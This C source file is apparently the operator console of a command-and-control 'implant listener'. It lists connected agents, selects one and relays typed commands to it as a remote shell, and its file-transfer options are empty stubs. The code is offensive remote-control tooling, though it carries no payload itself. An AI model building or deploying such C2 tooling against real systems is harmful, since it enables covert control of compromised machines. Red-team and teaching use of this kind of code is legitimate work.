/*
console.c

This function is responsible for handling user input. It will select an agent to interact with.
It will pass commands to the message handler and receive responses from the message handler

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/types.h>

#include "utility.h"
#include "queue.h"
#include "implant.h"
#include "base.h"
#include "console.h"
#include "listener_handler.h"

// Global variables
// Agents poll and states
extern Connected_Agents *connected_agents;
extern pthread_mutex_t agents_lock;
// Receive Queue
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
// Send Queue
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;
// SIGINT flag
extern volatile sig_atomic_t all_sigint;
extern volatile sig_atomic_t shell_sigint;
extern volatile sig_atomic_t shell_flag;

#define MENU "Provide an option.\n1 - list active agents\n2 - select active agent\n9 - exit\n"
#define AGENT_MENU "Implant %d selected.\nProvide an option.\n1 - interactive shell\n2 - put file\n3 - get file\n4 - stop agent\n5 - go back\n"

STATIC int agent_console(int agent_fd){
	char opt_buf[BUFFERSIZE];
	char command_buf[BUFFERSIZE];
	char* buffer;
	long option;
				 
	while(fgets(opt_buf, BUFFERSIZE - 1, stdin)){
		print_out(AGENT_MENU, agent_fd);
		option = strtol(opt_buf, NULL, 10);
		switch(option){
	        case 1:
				printf("Ctrl-c to leave shell\n");
				shell_flag = true;
				while (!shell_sigint){
					print_out("%s\n", "Command");
					buffer = malloc(BUFFERSIZE);
					memset(command_buf, 0, BUFFERSIZE);
	        		fgets(command_buf, BUFFERSIZE, stdin);
					memcpy(buffer, command_buf, BUFFERSIZE);

					listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, strlen(buffer));
				}
				shell_sigint = false;
				shell_flag = false;
	        	break;
	        case 2:
	        	break;
	        case 3:
	        	break;
	        case 4:
	        	break;
	        case 5:
	        	return 0;
	        default:
	        	print_out("%s\n", "Unknown option selected");
	        	break;
	    }
	}
	
	return 0;
}


void *console_thread(void *vargp){
	const char banner[] =	"   ___ _   _   ___ _   _   ________  _________ _       ___   _   _ _____ \n"
							"  |_  | | | | |_  | | | | |_   _|  \\/  || ___ \\ |     / _ \\ | \\ | |_   _|\n"
							"    | | | | |   | | | | |   | | | .  . || |_/ / |    / /_\\ \\|  \\| | | |  \n"
							"    | | | | |   | | | | |   | | | |\\/| ||  __/| |    |  _  || . ` | | |  \n"
							"/\\__/ / |_| /\\__/ / |_| |  _| |_| |  | || |   | |____| | | || |\\  | | |  \n"
							"\\____/ \\___/\\____/ \\___/   \\___/\\_|  |_/\\_|   \\_____/\\_| |_/\\_| \\_/ \\_/  \n";
	int retval;
	char buffer[BUFFERSIZE];
	long option;
    fd_set console_fds;
    struct timeval tv;
				 
	printf(banner);
	printf("\nWelcome to the implant listener.");
	
	print_out("%s", MENU);
	while(!all_sigint){
		
		tv.tv_sec = SELECT_TIMEOUT;
    	tv.tv_usec = 0;
    	FD_ZERO(&console_fds);
    	FD_SET(STDIN, &console_fds);

		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
        if (retval == -1){
            printf("select error\n");
			all_sigint = true;
			break;
        }
		else if (FD_ISSET(STDIN, &console_fds)){
			if (!fgets(buffer, BUFFERSIZE, stdin)){
				printf("fgets error\n");
				all_sigint = true;
				break;
			}

			option = strtol(buffer, NULL, 10);
			switch(option){
				case 9:
					all_sigint = true;
					break;
				case 1:
					printf("\n%s\n", "Active Agents\n-------------");
					pthread_mutex_lock(&agents_lock);
					for (int i = 0; i < FDSIZE; i++){
						if (connected_agents->agents[i].alive) printf(" %d\n", i);
					}
					printf("\n");
					pthread_mutex_unlock(&agents_lock);
					break;
				case 2:
					printf("Which agent?\n");
					fgets(buffer, BUFFERSIZE, stdin);
					option = strtol(buffer, NULL, 10);
					if (connected_agents->agents[option].alive){
						agent_console(option);
					}
					else{
						printf("agent dead\n");
					}
					break;
				default:
					printf("Unknown option selected\n");
					break;
			}
			print_out("%s", MENU);
        }
	}

	printf("console_thread done\n");
	return 0;
}